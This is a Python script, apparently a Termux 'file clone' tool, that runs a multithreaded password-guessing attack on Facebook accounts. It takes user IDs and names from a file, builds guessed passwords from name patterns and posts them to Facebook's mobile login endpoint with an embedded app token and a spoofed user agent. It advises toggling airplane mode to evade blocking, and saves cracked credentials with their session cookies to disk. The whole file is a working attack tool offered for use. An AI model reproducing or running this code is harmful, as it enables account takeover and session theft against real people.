# WRITTEN BY FAHIMXD
# FOLLOW MY GITHUB: https://github.com/fahimrahman143

# ------import------ #
import os
import random
import sys
import time
import uuid
os.system("clear")
print("                 😘 YOU'RE WELCOME BRO 🔥")
time.sleep(1.5)
try:
    import requests
    import bs4
    import mechanize
    import httpx
    import rich
    import json
    import subprocess
    import string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#ALL FIXED BY SHAJON
# ------Loop------ #
loop, ok, cp, user = 0, [], [], []
cok, plist = [], []

# ----------USER AGENT----------- #
def sanjida():
    ua = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    return ua

# ----------USER AGENT END---------- #

# ________________COLOUR______________ #
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
RED = '\033[1;31m'
wx = '\033[1;37m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
pink = '\033[1;35m'
G3 = '\x1b[38;5;48m'

# ________________LINE____________ #
def linex():
    print(f'{GREEN}──────────────────────────────────────────────────────')

def clear():
    os.system(f'clear')
    print(logo)

# ________________LOGO____________ #
logo =f"""\033[1;35m
███████╗ █████╗ ██╗  ██╗██╗███╗   ███╗██╗  ██╗██████╗ 
██╔════╝██╔══██╗██║  ██║██║████╗ ████║╚██╗██╔╝██╔══██╗
█████╗  ███████║███████║██║██╔████╔██║ ╚███╔╝ ██║  ██║
██╔══╝  ██╔══██║██╔══██║██║██║╚██╔╝██║ ██╔██╗ ██║  ██║
██║     ██║  ██║██║  ██║██║██║ ╚═╝ ██║██╔╝ ██╗██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ 
{A}──────────────────────────────────────────────────────
{A}[{A}={A}]{A} OWNER    {A}:{A} FAHIM XD
{X5}[{X5}={X5}]{X5} FACEBOOK {X5}:{X5} FAHIM RAHMANツ゚
{R}[{R}={R}]{R} TOOLTYPE {R}:{R} FILE CLONE ⚡
{S}[{S}={S}]{S} STATUS   {S}:{S} PAID$
{M}[{M}={M}]{M} WISH     {M}:{M} FREE FIRE ONLY ...!
{A}──────────────────────────────────────────────────────"""

# ________________MAIN____________ #
def menu():
    clear()
    print(f' {A}[{G1}1{A}]\x1b[033;1;31m FILE CLONE ')
    print(f' {A}[{G1}2{A}]\033[33;1m CONTACT OWNER ')
    print(f' {A}[{G1}0{A}]\x1b[033;1;34m EXIT TOOL ')
    linex()
    max = input(f' {G1}[{A}?{G1}]{G1} CHOICE {A}➢\x1b[1;96m ')
    if max in ['1']:
        file()
    elif max in ['2']:
        os.system('xdg-open https://facebook.com/crack.fahim143')
        menu()
    elif max in ['3']:
        sys.exit()
    else:
        menu()

#------file------#
def file():
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}FAHIM.txt')
    linex()
    file = input(f' {G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f' {G1}[{A}≈{G1}]{G1} FILE NOT FOUND')
        time.sleep(1)
        file()
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}')
    linex()
    limit = int(input(f' {G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))
    clear()
    for x in range(limit):
        print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')
        plist.append(input(f' {G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{x+1}{G1}]{G1} {A}➢{S} '))
        linex()
    with ThreadPool(max_workers=30) as maxxx:
        tl = str(len(fo))
        clear()
        print(f' {A}[{G1}≈{A}]{G1} TOTAL ID {A}➢\x1b[1;96m {tl}')
        print(f" {A}[{G1}={A}]\033[1;97m TURN {A}[\033[38;5;46mON{A}/\x1b[38;5;196mOFF{A}]\033[1;97m AIRPLANE MODE ")
        linex()
        for user in fo:
            ids, names = user.split('|')
            psd = plist
            maxxx.submit(SHAJON, ids, names, psd)
    print('')
    print(f' {G1}×××××××××××××××××××××××××××××××××××××××')
    print(f' {A}[{G1}≈{A}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f' {A}[{G1}≈{A}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f' {A}[{G1}≈{A}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f' {G1}×××××××××××××××××××××××××××××××××××××××')
    input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#------M1------#
def SHAJON(ids, names, psd):
    global loop, ok,cp
    sys.stdout.write(f'\r\r{A}[{G1}FAHIM-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{str(len(ok))}{A}]-[{G1}CP{A}:{G1}{str(len(cp))}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in psd:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": ids,
                "password": pas,
                "generate_analytics_claims": "1",
                "community_id": "",
                "cpl": "true",
                "try_num": "1",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "fb_api_req_friendly_name": "authenticate",
                "api_key": "62f8ce9f74b12f84c123cc23437a4a32",
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            }
            head = {
                "User-Agent": sanjida(),
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(2e4, 4e4)),
                "X-FB-SIM-HNI": str(random.randint(2e4, 4e4)),
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "X-FB-Connection-Type": "WIFI",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "62f8ce9f74b12f84c123cc23437a4a32"
            }
            po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
            if 'session_key' in po:
                print(f'\r\r{A}[{G1}FAHIM-XD-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                open('/sdcard/FAHIM-XDFILE-OK.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}FAHIMXD-404-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/FAHIMXD-FILE-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cp.append(ids)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
menu()